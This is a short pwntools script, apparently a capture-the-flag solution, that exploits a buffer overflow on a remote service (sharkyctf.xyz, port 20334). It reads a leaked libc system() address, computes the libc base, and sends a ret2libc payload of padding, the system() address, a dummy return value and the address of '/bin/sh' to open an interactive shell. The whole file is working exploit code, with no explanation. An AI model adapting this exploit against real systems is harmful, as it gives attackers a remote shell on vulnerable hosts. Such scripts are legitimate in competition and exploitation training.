from pwn import *
target=remote('sharkyctf.xyz' ,20334)
libc=ELF('./libc-2.27.so')

print(target.recvuntil("away: "))
libc_system=int(target.recvline().strip("\n"),16)
libc_base=libc_system-libc.symbols["system"]
print(hex(libc_base))
libc_binsh=libc_base+libc.search("/bin/sh\x00").next()

payload="A"*0x24
payload+=p32(libc_system)
payload+=p32(0xcafebabe)
payload+=p32(libc_binsh)

target.sendline(payload)
target.interactive()

